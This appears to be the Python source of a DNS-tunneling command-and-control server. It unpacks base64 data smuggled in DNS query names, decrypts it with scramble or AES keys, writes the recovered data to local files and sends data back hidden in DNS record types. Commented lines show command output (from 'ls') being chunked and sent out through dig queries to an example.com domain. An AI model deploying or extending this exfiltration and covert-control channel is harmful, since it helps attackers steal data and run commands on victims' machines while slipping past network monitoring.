import base64
import os
import socket
from urllib import request
from webbrowser import get
import dnslib as dns
import exfiltration as exf
from copy import deepcopy


#data = "The maximum size was originally 512 bytes but there is an extension to the DNS protocol that allows clients to indicate that they can handle UDP responses of up to 4096 bytes."


#data_encode = base64.b64encode(data.encode()).decode()


def chunk(data, chunk_size) -> list:
    """ Splits data into equal-sized chunks. """
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

'''d = os.popen('ls').read().encode()
d_encode = base64.b64encode(d)
#print(chunk(d_encode,58))

for i in range(len(chunk(d_encode,58))):
    print(chunk(d_encode.decode(),58)[i],end='')'''

#for i in range(len(chunk(data_encode,63))):
#        print(chunk(data_encode,63)[i])
#        os.system(f' dig {chunk(data_encode,63)[i]}.example.com @127.0.0.1 -p 5333')



def dns_resolve(query, tcp):
        """ 
            Resolves DNS request from one client at the time.
            Encodes its actual data and forms DNS response from it.
        """
        request = dns.DNSRecord.parse(query)
        reply = request.reply()
        
        domain = request.q.get_qname()
        qtype =  request.q.qtype
        data = exf.domain_decode(str(domain), base64.urlsafe_b64decode)
        
        # If encryption key is present - decode it for futher data decryption
        if (len(request.questions) > 1):
            enc_domain = str(request.questions[1].get_qname())
            enc_key = exf.domain_decode(enc_domain, base64.urlsafe_b64decode)
            # Descramble key
            enc_key = exf.scramble(enc_key, (4, 12), True)

            # Check if the key is scramble offset
            if len(enc_key) < 3:
                enc_key = tuple(enc_key) 
                data = exf.scramble(data, enc_key, True)
            # Or AES decryption key
            else:
                enc_key = enc_key.decode()
                data = exf.aes_decrypt(data, enc_key)
            # reply.add_question(request.questions[1])

        
        
        print(
            #f"Request: {request}\n",
            #f"reply : {reply}\n",
            #f"domain : {domain}\n",
            #f"qtypes : {qtype}\n",
            #f"data : {base64.b64decode(data.decode())}\n"
            #data.decode('utf-8'),
            
            
        )
        #print("***", f"DNS QTYPE is {qtype}")
        #print("***", f"Original data length {len(data)} bytes")
        #print("***", f"{data[:24]}...")

        data = base64.b64encode(data)

        core_domain = deepcopy(domain)
        # Get TLD domain from original object
        core_domain.label = domain.label[-2:]

        if (qtype == dns.QTYPE.A):
            data = exf.ip_encode(data, False)
        
        elif (qtype == dns.QTYPE.AAAA):
            data = exf.ip_encode(data, True)

        elif (qtype ==  dns.QTYPE.TXT):
            data = [dns.TXT(data)]
        
        elif (qtype == 10):     # NULL type
            data = [dns.RD(data)]
        
        else:
            data = exf.domain_encode(data, str(core_domain), base64.urlsafe_b64encode)
            if (qtype == dns.QTYPE.CNAME):
                data = [dns.CNAME(data)]
            elif (qtype ==  dns.QTYPE.MX):
                data = [dns.MX(data)]
            elif (qtype == dns.QTYPE.NS):
                data = [dns.NS(data)]

        for rd in data:
            reply.add_answer(dns.RR(str(domain), rtype=qtype, rdata=rd))
        
        raw_reply = reply.pack()
        # Truncate large (> 512 bytes) data for UDP payload
        if (len(raw_reply) > exf.MAX_DNS_LEN and not tcp):
            print("DNS", f"Response message is big! Truncate it...")
            reply.header.set_tc(1)
            raw_reply = reply.pack()[:exf.MAX_DNS_LEN]
        
        #print("DNS", f"Sending back the request in size {len(raw_reply)} bytes\n")
        return raw_reply


def getdata(query):
    request = dns.DNSRecord.parse(query)
    domain = request.q.get_qname()
    data = exf.domain_decode(str(domain), base64.urlsafe_b64decode)
    print(data.decode())
    print(base64.b64decode(data.decode('utf-8').strip()),end = '')



def request_data(data1):

    req_data = input("rage@rsam ~: ")

    if ' ' in req_data:
        req_data = req_data.replace(' ','#@')

    if req_data == ' ':
        req_data = 'none'
    print(req_data)
    os.popen(f'dig {req_data}.example.com @127.0.0.1 -p 5333')

    getdata(data1)
    



    
def init(query):
    request = dns.DNSRecord.parse(query)
    domain = request.q.get_qname()
    data = exf.domain_decode(str(domain), base64.urlsafe_b64decode)
    print(data.decode())
    if 'init' in data.decode():
        with open('client','a') as f:
            f.write(data.decode())
    else:
        with open('file','a') as f:
            f.write(data.decode())


    if data.decode() == 'init':
        #request_data(query)
        pass
        #getdata(query)
    else:
        #print("[**] Requesting\n")
        pass
    




ip = '127.0.0.1'
port = 53

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.bind((ip,port))

def server_init():
    if os.path.exists('size'):
        pass
    else:
        with open('size','a') as cli:
            cli.write('gAAAAABjKaZKLLlXphYtgaznKurab6UZVub6Rm6sa8MBmKThmhccFtzl-G8J2QYaxH7okAmM6_nlXMeF9Shw4F_ON468FXe_dylFxtsS3hcjpWlt78WAZH0=')
while True:
    server_init()
    data1, addr = sock.recvfrom(1024)

    #print("TCP", f"{addr} connected")
    
    response = dns_resolve(data1,False)
    sock.sendto(response, addr)

    init(data1)

    

    
